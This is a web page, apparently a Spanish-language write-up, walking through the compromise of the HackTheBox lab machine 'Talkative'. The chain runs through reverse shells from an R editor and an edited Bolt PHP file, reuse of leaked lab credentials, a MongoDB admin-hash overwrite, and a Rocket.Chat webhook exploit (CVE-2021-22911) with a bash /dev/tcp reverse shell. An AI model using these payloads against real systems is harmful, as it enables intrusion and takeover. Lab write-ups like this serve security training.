@@ -1,0 +1,340 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Talkative HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/talkative.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Talkative HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Talkative de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Talkative de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Talkative HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Talkative HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Talkative de la plataforma de HackTheBox","headline":"Writeup Talkative HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Talkative HackTheBox</h1>
+          <p>Resolución de la máquina Talkative de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ nmap</span><span class="p"> 10.10.11.155
+Nmap scan report for 10.10.11.155
+PORT      STATE SERVICE
+80/tcp   open     http
+3000/tcp open     ppp
+8080/tcp open     http-proxy
+8081/tcp open     blackice-icecap
+8082/tcp open     blackice-alerts</span>
+</code></pre></div></div>
+
+<div><p>Si enviamos un curl a 10.10.11.155 nos redirige a http://talkative.htb</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ curl</span><span class="p"> 10.10.11.155
+301 Moved Permanently
+The document has moved &lta href="https://talkative.htb/">here&lt/a></span>
+</code></pre></div></div> 
+
+<div><p>Al no haber nada interesante por ahora en el 80 iniciamos en el 8080 donde en el apartado de rjeditor podemos probar ejecutar un id con system() e intern=TRUE para ver la respuesta</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Ejecutamos con ctrl + shift + enter y en la respuesta vemos que se ejecuta</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Sabiendo esto nos hacemos una reverse shell</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Ejecutamos y si estamos en escucha con netcat la recibimos, encontramos un archivo omv en el home</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 443
+Connection received on 10.10.11.155
+</span><span class="s2">root@b06821bbda78</span><span class="p">:<span class="na">~</span><span class="p"># ls
+</span><span class="na">Documents</span><span class="p"> bolt-administration.omv
+</span><span class="s2">root@b06821bbda78</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div>
+
+<div><p>Tenemos un problema, y es que no tiene nc o algo que nos sirva para enviarnos el archivo asi esta vez usaremos pwncat-cs enviamos la shell y descargamos el archivo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo pwncat-cs</span><span class="p"> -lp 443
+Welcome to </span><span class="kd">pwncat</span><span class="p"> 🐈!
+</span><span class="s2">received</span><span class="p"> connection from </span><span class="na">10.10.11.155</span><span class="p">
+</span><span class="na">10.10.11.155</span><span class="p">: registered new host w/ db
+</span><span class="no">(local) </span><span class="k">pwncat</span><span class="p">$ </span><span class="s2">download</span><span class="p"> /root/bolt-administration.omv bolt-administration.omv
+</span><span class="na">/root/bolt-administration.omv </span><span class="s2">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ </span><span class="k">100.0%</span><span class="p"> • </span><span class="s2">2.2/2.2 KB</span><span class="p">
+downloaded </span><span class="na">2.19KiB</span><span class="p"> in</span><span class="s2"> 0.00</span><span class="p"> seconds
+</span><span class="no">(local)</span><span class="k"> pwncat</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Ahora que tenemos el archivo podemos ver que es un zip, entonces lo descomprimimos y vemos un archivo que contiene credenciales</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ file</span><span class="p"> bolt-administration.omv
+bolt-administration.omv: Zip archive data, at least v2.0 to extract
+</span><span class="s2">❯ unzip</span><span class="p"> bolt-administration.omv
+</span><span class="s2">❯ cat</span><span class="p"> xdata.json | </span><span class="s2">jq</span><span class="p">
+{
+  </span><span class="na">"A"</span><span class="p">: {
+    </span><span class="na">"labels"</span><span class="p">: [
+      [
+        0,
+        </span><span class="s2">"Username"</span><span class="p">,
+        </span><span class="s2">"Username"</span><span class="p">,
+        false
+      ],
+      [
+        1,
+        </span><span class="s2">"matt@talkative.htb"</span><span class="p">,
+        </span><span class="s2">"matt@talkative.htb"</span><span class="p">,
+        false
+      ],
+      [
+        2,
+        </span><span class="s2">"janit@talkative.htb"</span><span class="p">,
+        </span><span class="s2">"janit@talkative.htb"</span><span class="p">,
+        false
+      ],
+      [
+        3,
+        </span><span class="s2">"saul@talkative.htb"</span><span class="p">,
+        </span><span class="s2">"saul@talkative.htb"</span><span class="p">,
+        false
+      ]
+    ]
+  },
+  </span><span class="na">"B"</span><span class="p">: {
+    </span><span class="na">"labels"</span><span class="p">: [
+      [
+        0,
+        </span><span class="s2">"Password"</span><span class="p">,
+        </span><span class="s2">"Password"</span><span class="p">,
+        false
+      ],
+      [
+        1,
+        </span><span class="s2">"jeO09ufhWD&lts"</span><span class="p">,
+        </span><span class="s2">"jeO09ufhWD&lts"</span><span class="p">,
+        false
+      ],
+      [
+        2,
+        </span><span class="s2">"bZ89h}V&ltS_DA"</span><span class="p">,
+        </span><span class="s2">"bZ89h}V&ltS_DA"</span><span class="p">,
+        false
+      ],
+      [
+        3,
+        </span><span class="s2">")SQWGm>9KHEA"</span><span class="p">,
+        </span><span class="s2">")SQWGm>9KHEA"</span><span class="p">,
+        false
+      ]
+    ]
+  },
+  </span><span class="na">"C"</span><span class="p">: {
+    </span><span class="na">"labels"</span><span class="p">: []
+  }
+}</span>
+</code></pre></div></div>
+
+<div><p>Si aplicamos una pequeña expresión podemos quedarnos solo con usuarios y contraseñas</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat</span><span class="p"> xdata.json | </span><span class="s2">jq </span><span class="p">|</span><span class="s2"> grep</span><span class="no"> '"*",'</span><span class="p"> | </span><span class="s2">awk</span><span class="no"> '{print $1}'</span><span class="p"> |</span><span class="s2"> tr </span><span class="p">-d</span><span class="no"> "\","</span><span class="p"> |</span><span class="s2"> sed </span><span class="no">'s/@talkative.htb//g' </span><span class="p">|</span><span class="s2"> grep</span><span class="p"> -vE </span><span class="no">"U|P"</span><span class="p"> |</span><span class="s2"> uniq </span><span class="p">
+matt
+janit
+saul
+jeO09ufhWD&lts
+bZ89h}V&ltS_DA
+)SQWGm>9KHEA</span>
+</code></pre></div></div>
+
+<div><p>Si miramos el nombre del archivo hay algo de bolt y con whatweb encontramos lo mismo, podemos pensar que hay una ruta /bolt en el puerto 80, podriamos usar fuerza bruta pero no es necesario</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ whatweb</span><span class="p"> http://talkative.htb/
+MetaGenerator[</span><span class="kd">Bolt</span><span class="p">]
+X-Powered-By[PHP/7.4.28, </span><span class="kd">Bolt</span><span class="p">]</span>
+</code></pre></div></div>
+
+<div><p>Entonces en http://talkative.htb/bolt, encontramos que la contraseña "jeO09ufhWD&lts" es valida pero para admin</p></div>
+<div><p><img src="./4.png"><p></div>
+
+<div><p>Una vez iniciamos sesión encontramos un "All configuration files" asi que damos clic</p></div>
+<div><p><img src="./5.png"><p></div>
+
+<div><p>Vemos varios archivos entre ellos "blundes.php" asi que damos clic en el</p></div>
+<div><p><img src="./6.png"><p></div>
+
+<div><p>¡Podemos editarlo! asi que usaremos la función system para enviarnos una reverse shell</p></div>
+<div><p><img src="./7.png"><p></div>
+
+<div><p>Una vez cambiamos el php, guardamos cambios y basta con recargar la pagina para recibir una shell en nuestro netcat</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 443
+Connection received on 10.10.11.155
+</span><span class="s2">www-data@c09bd9dee948</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Estamos como www-data en otro contenedor, como nuestra ip es 172.17.0.10 supongo que existe la 172.17.0.1, bueno, tendremos que pensar que si ...</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@c09bd9dee948</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+172.17.0.10 
+</span><span class="s2">www-data@c09bd9dee948</span><span class="p">:</span><span class="na">~</span><span class="p">$ ping -c1 172.17.0.1
+bash: ping: command not found
+</span><span class="s2">www-data@c09bd9dee948</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Podemos probar las contraseñas y usuarios de antes, y saul reutiliza la contraseña "jeO09ufhWD&lts"</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@c09bd9dee948</span><span class="p">:</span><span class="na">~</span><span class="p">$ ssh saul@172.17.0.1
+saul@172.17.0.1's password: </span><span class="kd">jeO09ufhWD&lts</span><span class="p">
+</span><span class="s2">saul@talkative</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user.txt
+850**************************2a4
+</span><span class="s2">saul@talkative</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Ahora buscando formas de escalar privilegios con <a href="https://github.com/DominicBreuker/pspy">pspy</a> encontramos lo siguiente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">CMD: UID=0    PID=4894   | /bin/sh -c python3 /root/.backup/update_mongo.py</span>
+</code></pre></div></div>
+
+<div><p>El puerto por defecto de mongo es 27017 que con netstat vemos que esta en la 172.17.0.2</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">saul@talkative</span><span class="p">:</span><span class="na">~</span><span class="p">$ netstat -nat
+&lt...........................................................................>
+tcp        0      0 172.17.0.1:43752        </span><span class="kd">172.17.0.2</span><span class="p">:</span><span class="kd">27017</span><span class="p">        TIME_WAIT  
+&lt...........................................................................>
+</span><span class="s2">saul@talkative</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Con <a href="https://github.com/jpillora/chisel">chisel</a> tunelizaremos el puerto 27017 de la 172.17.0.2 a nuestro localhost</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ chisel</span><span class="p"> server --reverse --port 8000
+2022/06/14 22:17:01 server: Reverse tunnelling enabled
+2022/06/14 22:17:01 server: Listening on http://0.0.0.0:8000
+2022/06/14 22:18:03 server: session#1: tun: proxy#R:27017=>172.17.0.2:27017: Listening</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">saul@talkative</span><span class="p">:</span><span class="na">~</span><span class="p">$ ./chisel client 10.10.14.10:8000 R:27017:172.17.0.2:27017
+2022/06/15 03:18:01 client: Connecting to ws://10.10.14.10:8000
+2022/06/15 03:18:03 client: Connected</span>
+</code></pre></div></div>
+
+<div><p>Nos conectaremos a mongosh y con este <a href="https://docs.rocket.chat/guides/administration/advanced-admin-settings/restoring-an-admin">ejemplo</a> cambiaremos la contraseña de admin del puerto 3000, que es un rocketchat</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ mongosh</span><span class="p"> mongodb://127.0.0.1:27017
+Current Mongosh Log ID: 62a94faa5d321f37e77344f9
+Connecting to:          mongodb://127.0.0.1:27017/mongosh+1.3.1
+Using MongoDB:          4.0.26
+Using Mongosh:          1.3.1
+
+rs0 [direct: primary] test</span><span class="kd">></span><span class="p"> show databases
+admin    106 kB
+config   127 kB
+local   11.9 MB
+meteor  4.87 MB
+
+rs0 [direct: primary] test</span><span class="kd">></span><span class="p"> use meteor
+switched to db meteor
+
+rs0 [direct: primary] meteor</span><span class="kd">></span><span class="p"> db.getCollection('users').update({username:"admin"}, { $set: {"services" : { "password" : {"bcrypt" : "$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG" } } } })
+
+{
+  acknowledged: true,
+  insertedId: null,
+  matchedCount: </span><span class="no">1</span><span class="p">,
+  modifiedCount: </span><span class="no">1</span><span class="p">,
+  upsertedCount: 0
+}
+
+rs0 [direct: primary] meteor</span><span class="kd">></span><span class="p"></span>
+</code></pre></div></div>
+
+<div><p>Ahora que la cambiamos nos conectamos a <a href="http://talkative.htb:3000">talkative.htb:3000</a> como admin con la contraseña "12345"</p></div>
+
+<div><p>Una vez iniciamos sesión iremos a el apartado administración y daremos clic en integreaciones</p></div>
+<div><p><img src="./8.png"><p></div>
+
+<div><p>Daremos clic a nueva integración</p></div>
+<div><p><img src="./9.png"><p></div>
+
+<div><p>Crearemos un WebHook entrante</p></div>
+<div><p><img src="./10.png"><p></div>
+
+<div><p>Tenemos que habilitarlo y cambiar algunas cosas como nombre, canal y usuario</p></div>
+<div><p><img src="./11.png"><p></div>
+
+<div><p>Abajo podemos alojar un script usaremos la primera linea de el <a href="https://github.com/CsEnox/CVE-2021-22911">CVE-2021-22911</a> y en la segunda una reverse shell, en este caso creada con la herramienta de <a href="https://github.com/0bfxgh0st/ShellStorm">0bfxgh0st</a></p></div>
+<div><p>Al final quedaria algo asi</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="k">const require </span><span class="kd">=</span><span class="na"> console</span><span class="p">.</span><span class="k">log</span><span class="p">.</span><span class="k">constructor</span><span class="p">(</span><span class="s2">'return process.mainModule.require</span><span class="p">'</span><span class="p">)();
+</span><span class="k">require</span><span class="p">(</span><span class="s2">'child_process'</span><span class="p">).</span><span class="k">exec</span><span class="p">('</span><span class="s2">bash -c "bash -i >& /dev/tcp/10.10.14.10/443 0>&1"</span><span class="p">');
+</code></pre></div></div>
+
+<div><p>Lo pegaremos en la parte de abajo y lo habilitaremos</p></div>
+<div><p><img src="./12.png"><p></div>
+
+<div><p>Guardamos y despues buscaremos la url con el token</p></div>
+<div><p><img src="./13.png"><p></div>
+
+<div><p>Hacemos un curl y recibiremos la shell en nuestro netcat de nuevo en un contenedor</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> http://talkative.htb:3000/hooks/vbMEso8HDmzn2GA63/dvk8MyRaWRfwjdJXHc5wDAWSRHy48tNtn5X44Wgc2Yjipzqw
+{"success":false}</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 443
+Connection received on 10.10.11.155
+</span><span class="s2">root@c150397ccd63</span><span class="p">:</span><span class="na">/app/bundle/programs/server</span><span class="p"># hostname -I
+172.17.0.3
+</span><span class="s2">root@c150397ccd63</span><span class="p">:</span><span class="na">/app/bundle/programs/server</span><span class="p">#</span>
+</code></pre></div></div>
+
+<div><p>Podemos utilizar <a href="https://github.com/cdk-team/CDK">cdk</a> para conseguir archivos de la máquina real, lo subiremos con pwncat-cs, lo ejecutamos y conseguimos la flag de root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo pwncat-cs</span><span class="p"> -lp 443
+Welcome to </span><span class="kd">pwncat</span><span class="p"> 🐈!
+</span><span class="s2">received</span><span class="p"> connection from </span><span class="na">10.10.11.155</span><span class="p">
+</span><span class="na">10.10.11.155</span><span class="p">: registered new host w/ db
+</span><span class="no">(local) </span><span class="k">pwncat</span><span class="p">$</span><span class="s2"> upload</span><span class="p"> cdk_linux_amd64 /root/cdk
+</span><span class="na">/root/cdk</span><span class="s2"> ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ </span><span class="k">100.0%</span><span class="p"> •</span><span class="s2"> 11.9/11.9 MB</span><span class="p">
+uploaded </span><span class="na">11.9 MB</span><span class="p"> in</span><span class="s2"> 0.00 </span><span class="p">seconds
+</span><span class="no">(local) </span><span class="k">pwncat</span><span class="p">$</span><span class="s2"> back</span><span class="kd">
+(remote) </span><span class="no">root@c150397ccd63</span><span class="p">:</span><span class="na">/app/bundle/programs/server</span><span class="p"># cd /root
+</span><span class="kd">(remote) </span><span class="no">root@c150397ccd63</span><span class="p">:</span><span class="na">/root</span><span class="p"># bash
+</span><span class="s2">root@c150397ccd63</span><span class="p">:</span><span class="na">~</span><span class="p"># chmod +x cdk
+</span><span class="s2">root@c150397ccd63</span><span class="p">:</span><span class="na">~</span><span class="p"># ./cdk run cap-dac-read-search /root/root.txt
+Running with target: /root/root.txt, ref: /etc/hostname
+6ae**************************b91</span>
+</span><span class="s2">root@c150397ccd63</span><span class="p">:</span><span class="na">~</span><span class="p">#
+</code></pre></div></div>
+
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
